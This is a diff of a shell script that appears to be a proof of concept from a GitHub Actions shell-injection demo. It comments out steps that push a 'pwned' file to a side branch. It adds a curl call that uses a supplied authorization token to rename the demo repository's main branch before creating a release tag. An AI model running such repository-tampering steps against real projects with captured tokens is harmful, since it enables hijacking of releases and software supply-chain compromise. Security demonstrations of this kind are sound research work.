@@ -6,13 +6,19 @@ SIDE_BRANCH="side-branch"
 RELEASE="v1.0.4"
 
 # Create content in a side branch
-echo pwned > pwned.txt
-git checkout -b $SIDE_BRANCH
-git add pwned.txt
-git commit -m ""
-git push origin $SIDE_BRANCH
+#echo pwned > pwned.txt
+#git checkout -b $SIDE_BRANCH
+#git add pwned.txt
+#git commit -m ""
+#git push origin $SIDE_BRANCH
 
-commit_hash=$(git rev-parse HEAD)
+#commit_hash=$(git rev-parse HEAD)
+
+curl --request POST \
+  --url https://api.github.com/repos/minusworld-gha-demo/shell-injection/branches/main/rename \
+  --header "Authorization: $authfield" \
+  --header "Accept: application/vnd.github.v3+json" \
+  --data "{ \"new_name\": \"oldmain\" }"
   
 # Create a tag using the side branch
 curl --request POST \
